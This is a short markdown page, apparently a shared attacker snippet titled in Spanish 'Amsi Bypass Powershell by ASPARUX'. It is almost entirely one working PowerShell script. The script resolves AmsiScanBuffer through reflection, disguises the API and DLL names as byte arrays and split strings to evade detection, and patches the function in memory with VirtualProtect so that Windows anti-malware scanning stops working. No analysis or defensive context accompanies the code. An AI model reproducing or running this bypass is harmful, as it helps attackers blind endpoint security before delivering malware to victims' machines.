# Amsi Bypass Powershell by ASPARUX

## Parcheo AmsiScanBuffer con Reflection

```
function Get-Function
{
    Param(
        [string] $module,
        [string] $function
    )
    $moduleHandle = $GetModule.Invoke($null, @($module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $moduleHandle)
    $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $function))
}

function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )
    $type = [AppDomain]::("Curren" + "tDomain").DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()
    [System.Runtime.InteropServices.Marshal]::("GetDelegate" +"ForFunctionPointer")($funcAddr, $delegate)
}

Add-Type -AssemblyName System.Windows.Forms
$unsafeMethodsType = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
$GetModule = $unsafeMethodsType.GetMethod("GetModu" + "leHandle")
$GetAddres = $unsafeMethodsType.GetMethod("GetProc" + "Address")
$somewhere = [Byte[]](0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$dll = [System.Text.Encoding]::ASCII.GetString($nowhere)
$func = [System.Text.Encoding]::ASCII.GetString($somewhere)
$amsi = Get-Function $dll $func
$c = 't'
$replace = 'Virt' + 'ualProtec'
$name = '{0}{1}' -f $replace, $c
$protect = Get-Function "kernel32.dll" $name
$notp = 0
$vt = Get-Delegate $protect @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())
$vt.Invoke($amsi, 5, 0x40, [ref]$notp)
$stopitplease = [Byte[]](0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
$marshalClass = [System.Runtime.InteropServices.Marshal]
$marshalClass::Copy($stopitplease, 0, $amsi, $stopitplease.Length)

```
